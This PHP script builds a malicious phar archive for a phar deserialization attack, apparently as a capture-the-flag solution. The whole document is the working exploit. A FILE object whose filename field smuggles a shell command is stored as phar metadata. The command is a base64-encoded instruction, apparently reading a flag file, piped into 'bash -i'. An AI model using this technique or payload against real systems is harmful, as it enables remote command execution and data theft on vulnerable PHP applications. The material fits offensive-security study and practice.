<?php

class FILE{
    public $filename=";echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash -i>4.txt";
    public $lasttime;
    public $size;
    public function remove(){
        unlink($this->filename);
    }
    public function show()
    {
        echo "Filename: ". $this->filename. "  Last Modified Time: ".$this->lasttime. "  Filesize: ".$this->size."<br>";
    }
}

#获取phar包
try {
  $phar = new Phar("abc.phar");
  $phar->startBuffering();
  $phar->setStub("<?php __HALT_COMPILER(); ?>");
  
  $o = new FILE();
  $phar->setMetadata($o);
  $phar->addFromString("test.txt", "test");
  $phar->stopBuffering();
} catch (Exception $e) {
    die($e);
}
?>